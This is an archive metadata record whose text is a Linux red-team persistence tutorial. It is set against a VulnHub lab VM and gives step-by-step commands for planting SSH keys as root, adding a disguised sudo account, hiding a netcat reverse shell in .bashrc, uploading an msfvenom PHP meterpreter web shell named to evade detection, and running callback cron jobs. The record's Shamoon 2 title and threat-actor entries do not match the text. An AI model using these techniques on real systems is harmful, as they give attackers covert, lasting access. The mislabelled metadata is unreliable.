{
    "id": "6e8c140d-3429-48a8-8012-d54af3a21f0b",
    "created_at": "2023-01-12T15:09:56.077351Z",
    "updated_at": "2025-03-27T02:09:07.85224Z",
    "deleted_at": null,
    "sha1_hash": "6e7ca218fde2da5cdf31338447e2684d3dc2913c",
    "title": "2016-11-30 - Shamoon 2- Return of the Disttrack Wiper",
    "authors": "",
    "file_creation_date": "2022-01-17T12:52:45Z",
    "file_modification_date": "2022-01-17T12:52:45Z",
    "file_size": 648877,
    "plain_text": "# Linux Red Team Persistence Techniques\n\n**[linode.com/docs/guides/linux-red-team-persistence-techniques](https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/)**\n\n## Before You Begin\n\nIn order to follow along with the tools and techniques utilized in this document, you will need\nto use one of the following offensive Linux distributions:\n\nKali Linux\n\nParrot OS\n\nThe demonstrations outlined in this document were performed against a vulnerable Linux\nVM that has been configured to teach you the process of exploitation and privilege escalation.\n[It can be downloaded here: https://www.vulnhub.com/entry/raven-1,256/](https://www.vulnhub.com/entry/raven-1,256/)\n\nThe following is a list of recommended technical prerequisites that you will need in order to\nget the most out of this course:\n\nFamiliarity with Linux system administration.\n\nFamiliarity with Windows.\n\nFunctional knowledge of TCP/IP.\n\nFamiliarity with penetration testing concepts and life-cycle.\n\nNote: The techniques and tools utilized in this document were performed on Kali Linux\n2021.2 Virtual Machine\n\n## MITRE ATT&CK Persistence Techniques\n\nPersistence consists of techniques that adversaries use to keep access to systems across\nrestarts, changed credentials, and other interruptions that could cut off their access.\nTechniques used for persistence include any access, action, or configuration changes that let\nthem maintain their foothold on systems, such as replacing or hijacking legitimate code or\nadding startup code.\n\nGaining an initial foothold is not enough, you need to set up and maintain persistent access\nto your targets.\n\nThe techniques outlined under the Persistence tactic provide us with a clear and methodical\nway of obtaining establishing persistence on the target system.\n\n\n-----\n\nThe following is a list of key techniques and sub techniques that we will be exploring:\n\nAccount Manipulation\n\nPersistence via SSH Keys\nCreating a privileged local account\n\nUnix shell configuration modification\n\nBackdooring the .bashrc file\nWeb Shell/Backdoor\n\nCron jobs\n\n## Scenario\n\nOur objective is to establish persistence on the Linux target after we have obtained an initial\nfoothold.\n\nNote: Some persistence techniques will require “root” privileges in order to be executed\nsuccessfully.\n\n## Persistence via SSH Keys\n\nThe first persistence technique we will be exploiting is the process of generating and using\nSSH key-based authentication as opposed to password-based authentication. This\npersistence technique will help maintain access to the target system if the user account\npasswords have been changed, as this is quite a common practice in companies that have\npassword security policies in place.\n\nNote: This technique requires Public Key Authentication to be enabled in the SSH\n[configuration file, more information see SSH add keys](https://www.linode.com/docs/guides/use-public-key-authentication-with-ssh/)\n\nIn order to perform this technique, you need to have obtained initial access to the target\nsystem and you will require “root” privileges if you wish to modify the SSH configuration file.\n\n1. The first step will involve generating the SSH key-pair, this will need to be done on your\n\nKali VM as this is the system we will be using for authentication via SSH. This can be\ndone by running the following command:\n```\n    ssh-keygen\n\n```\n\n-----\n\n2. As highlighted in the following screenshot, this will prompt you to specify the storage\n\nlocation for the public and private keys that will be generated, as well as a passphrase\nfor the SSH key. In this case, we will use the default options.\n\n3. After generating the public and private key pair, you will need to copy the content of the\n\npublic key (id_rsa.pub) you generated and add it to the “authorized_keys” file in the\ntarget user account’s .ssh directory on the target system. In this case, we will be adding\nthe public key to the “authorized_keys” file of the “root” user located in\n```\n  /root/.ssh/authorized_keys .\n\n```\nNote: If the .ssh directory and “authorized_keys” file don’t exist, you will need to create\nthem, this can be done by running the following commands:\n```\n  mkdir ~/.ssh\n  touch ~/.ssh/authorized_keys\n\n```\n4. After pasting in the contents of the public key you generated into the “authorized_keys”\n\nfile, it should look similar to the screenshot shown below.\n\n\n-----\n\n5. It is also recommended to apply the necessary permissions to the .ssh directory and\n\n“authorized_keys” file, this can be done by running the following commands:\n```\n    chmod 700 /root/.ssh\n    chmod 600 /root/.ssh/authorized_keys\n\n```\n6. As shown in the following screenshot, after adding the public key you generated, you\n\nwill now be able to authenticate to the target via SSH without providing a password.\n\nWe have now been able to successfully set up persistent access via SSH keys and\nconsequently mitigating any future authentication failures caused by changed\npasswords.\n\n## Creating A Privileged Local Account\n\nThe next persistence technique we will be exploring is the process of creating a privileged\nlocal account for backdoor access, this technique can be used to maintain access to a target\nsystem if a user account password is changed, however, creating a local user account may\nlead to detection on servers that have fewer user and service accounts as a new user will\neasily be noticed.\n\nIn order to evade detection, we will create a user account with a name that is clandestine, in\nthis case, we will be creating a user account named “ftp” in order to blend in as a service\naccount.\n\nNote: You will require “root” privileges in order to create a new user account on Linux\nsystems.\n\n1. We can create the user account on the target by running the following command:\n```\n    useradd -m -s /bin/bash ftp\n\n```\n\n-----\n\n2. After creating the account, we will need to add the user to the sudo group, this will\n\nprovide the user with administrative privileges, this can be done by running the\nfollowing command:\n```\n  usermod -aG sudo ftp\n\n```\n3. After adding the user account to the “sudo” group, we will need to setup a password for\n\nthe account, this can be done by running the following command:\n```\n  passwd ftp\n\n```\n4. After specifying the password, we can list out the contents of the /etc/passwd file to\n\nconfirm that the user account has been added.\n\n5. You can now authenticate with the new user account via SSH password authentication,\n\nalternatively, you can also add the ssh public key we generated in the first section to the\n“authorized_keys” file in the user account’s home password.\n\n6. After authenticating with the server via SSH, we can confirm that the user account has\n\nadministrative privileges by using the sudo command.\n\nAs shown in the preceding screenshot, the user account has administrative privileges\nand can run any command on the system without accessing or interacting with a “root”\naccount.\n\nThis account can be used for backdoor access whenever you want to avoid using the\n“root” account or any other legitimate user accounts on the target system and ensures\nthat you have overt access to the target.\n\n\n-----\n\n## Unix Shell Configuration Modification\n\nThis persistence technique will involve adding a bash reverse command that will connect\nback to our netcat listener in a user account’s .bashrc file. The .bashrc file is a config file that\nis used to customize bash and is executed when a user logs in with the bash shell.\n\n1. The first step will involve opening the .bashrc file with a text editor This can be done by\n\nrunning the following command:\n```\n    nano ~/.bashrc\n\n```\n2. After opening the file with a text editor, we can add a simple bash command that will\n\nprovide us with a reverse shell whenever a user logs in. This can be done by adding the\nfollowing command:\n```\n    nc -e /bin/bash <KALI-IP> <PORT> 2>/dev/null &\n\n```\nAs shown in the following screenshot, the command should contain your Kali IP and\nport netcat is listening on.\n\n3. After adding the bash command to the .bashrc file, we can set up a listener with Netcat\n\non Kali by running the following command:\n```\n    nc -nvlp <PORT>\n\n```\n4. Whenever a user logs in to the user account, the command in the .bashrc file will be\n\nexecuted and will consequently provide you with a reverse shell on the netcat listener as\nshown in the following screenshot.\n\nWe have now been able to set up persistence via the .bashrc file, this technique has the\nadded advantage of being harder to detect as the reverse shell command is hidden\nwithin a legitimate configuration file.\n\n## Persistence Via Web Shell\n\n\n-----\n\nThis persistence technique involves generating and uploading a PHP web shell to the target\nserver. Given that the target server is running the LAMP stack, we can create a PHP\nmeterpreter payload and upload it to the web server as a backdoor.\n\n1. The first step will involve generating the PHP meterpreter payload with Msfvenom, this\n\ncan be done by running the following command:\n```\n    msfvenom -p php/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=<PORT> -e\n   php/base64 -f raw > backup.php\n\n```\nIn order to evade detection, we will save the payload with a filename of “backup.php”.\n\n2. Once you have generated the payload, you will need to modify it by adding the PHP tags\n\nso that the script is executed correctly as shown in the following screenshot.\n\n3. We can now set up the listener with Metasploit by running the following commands:\n```\n    msfconsole\n    use multi/handler\n    set payload php/meterpreter/reverse_tcp\n    set LHOST <KALI-IP>\n    set LPORT <PORT>\n    run\n\n```\n4. The next step will involve uploading the PHP shell that we just generated to the web\n\nserver, this can be done by setting up a local web server on the Kali VM:\n```\n    sudo python -m SimpleHTTPServer 80\n\n```\n5. Then, download it on the target:\n```\n    wget http://<KALI-IP>/backup.php\n\n```\nIn this case, we will be uploading the “backup.php” file to the root of the webserver\nunder the /var/www/html directory as shown in the following screenshot.\n\n6. We can retrieve a meterpreter session on the target by navigating to the “backup.php”\n\nfile on the webserver by accessing the following URL with your browser:\n```\n    http://<SERVER-IP>/backup.php\n\n```\n\n-----\n\n7. Accessing the through the browser should execute the PHP code and consequently\n\nprovide you with a meterpreter session on your listener as shown in the following\nscreenshot.\n\nWe have been able to successfully set up persistence by uploading a meterpreter web\nshell that allows us to maintain access to the target server without authenticating via\nSSH.\n\n## Persistence Via Cron Jobs\n\nThis technique involves leveraging Cron jobs to maintain persistent access to the target\nsystem by executing a reverse shell command or a web shell repeatedly on a specified\nschedule.\n\nCron is a time-based service that runs applications, scripts, and other commands repeatedly\non a specified schedule.\n\nCron provides you with the ability to run a program, script, or command periodically at\nwhatever time you choose, these Cron jobs are then stored in the “crontab” file.\n\n1. We can add a cron job on the target system by editing the crontab file, this can be done\n\nby running the following command on the target system:\n```\n    crontab -e\n\n```\n2. We can now add a new cron job that will execute a netcat command every minute, this\n\ncan be done by adding the following line to the crontab file:\n```\n    * * * * * nc <KALI-IP> <PORT> -e /bin/sh\n\n```\nAs shown in the following screenshot, this cron job will connect to a netcat listener\nevery minute.\n\n3. After adding the cron job, you will need to save the file.\n\n4. We can now set up our netcat listener by running the following command on Kali:\n```\n    nc -nvlp <PORT>\n\n```\nAfter one minute, the cron job will be executed and you should receive a reverse shell\non your netcat listener as shown in the following screenshot.\n\n\n-----\n\n5. Alternatively, instead of using netcat to obtain a reverse shell, we can create a cron job\n\nthat executes the PHP meterpreter shell we created and uploaded in the previous\nsection. This can be done by adding the following line to the crontab file:\n```\n  * * * * * php -f /var/www/html/backup.php\n\n```\nAs shown in the following screenshot, after one minute you should receive a\nmeterpreter session.\n\nWe have now been able to successfully setup persistence on the target server by\ncreating a cron job that connects back to our listener, additionally, we were also able to\nsetup a cron job that executes the PHP meterpreter shell we uploaded to the target\nserver.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Persistence/Linux Red Team Persistence Techniques.pdf"
    ],
    "report_names": [
        "Linux Red Team Persistence Techniques.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536196,
    "ts_updated_at": 1743041347,
    "ts_creation_date": 1642423965,
    "ts_modification_date": 1642423965,
    "files": {
        "pdf": "https://archive.orkl.eu/6e7ca218fde2da5cdf31338447e2684d3dc2913c.pdf",
        "text": "https://archive.orkl.eu/6e7ca218fde2da5cdf31338447e2684d3dc2913c.txt",
        "img": "https://archive.orkl.eu/6e7ca218fde2da5cdf31338447e2684d3dc2913c.jpg"
    }
}